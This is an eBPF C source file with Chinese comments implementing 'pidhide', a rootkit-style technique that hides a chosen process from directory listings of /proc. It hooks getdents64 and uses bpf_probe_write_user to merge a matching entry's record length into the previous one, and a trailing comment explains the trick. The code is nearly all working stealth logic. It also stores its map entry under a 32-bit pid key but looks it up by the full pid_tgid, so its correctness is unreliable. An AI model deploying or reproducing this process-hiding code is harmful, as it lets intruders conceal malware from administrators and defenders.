#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "pidhide.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffers SEC(".maps"); //存储目录项（dentry）的缓冲区地址。

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps"); //用于在数据循环中启用搜索。

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps"); //存储了需要被修改的目录项（dentry）的地址。

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps"); //保存程序的尾部调用。


const volatile int target_ppid = 0;


const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN];
/*
struct linux_dirent64 {
	u64 d_ino;
	s64 d_off;
	short unsigned int d_reclen;
	unsigned char d_type;
	char d_name[0];
};*/

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();

    if(target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if(ppid != target_ppid) {
            return 0;
        }
    }

    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    struct linux_dirent64 *dirent = (struct linux_dirent64 *) ctx->args[1];
    bpf_map_update_elem(&map_buffers, &pid, &dirent, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    /* getdents64(2)
    RETURN VALUE
       On  success,  the number of bytes read is returned.  On end of directory, 0 is returned.  On error, -1
       is returned, and errno is set to indicate the error.
    */
    //ret是getdents64的返回值
    int total_bytes_read = ctx->ret;
    if(total_bytes_read <= 0) {
        return 0;
    }

    //找出存储的linux_dirent64 *
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffers, &pid_tgid);
    if(pbuff_addr == 0) {
        return 0;
    }
    //转化
    long unsigned int buffer_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if(pBPOS != 0) {
        bpos = *pBPOS;
    }

    for(int i = 0; i < 200; i++) {
        if(bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buffer_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

        //检测是否匹配
        int j = 0;
        for(j = 0; j < pid_to_hide_len; j++) {
            if(filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        //匹配成功，j一定是pid_to_hide_len
        if(j == pid_to_hide_len) {
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffers, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        //为下一个做准备
        bpos += d_reclen;    
    }

    if(bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }

    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffers, &pid_tgid);
    
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents64_patch(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if(pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);


    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    bpf_printk("[PID_TO_HIDE] filename previous: %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len - 1] = 0x00;
    bpf_printk("[PID_TO_HIDE] filename next one: %s\n", filename);


    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if(e) {
        e->success = (ret == 0);
        e->pid = pid_tgid >> 32;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}
/*
覆盖过程:并不是真正的删除，而是通过覆盖达到假删除的效果
在 handle_getdents64_patch 中，程序找到匹配的目录项。
为了隐藏该项，它将当前项的记录长度 d_reclen 与下一个项的 d_reclen 合并。
比如，如果 hidden_file 的 d_reclen 为 20字节，而下一项 file2 的 d_reclen 为 25字节，那么合并后 d_reclen 设置为 45，覆盖在第一个项上。
这样，下一项（file2）的位置被直接连接到前一项（file1），从而删除了 hidden_file 的项。
 */
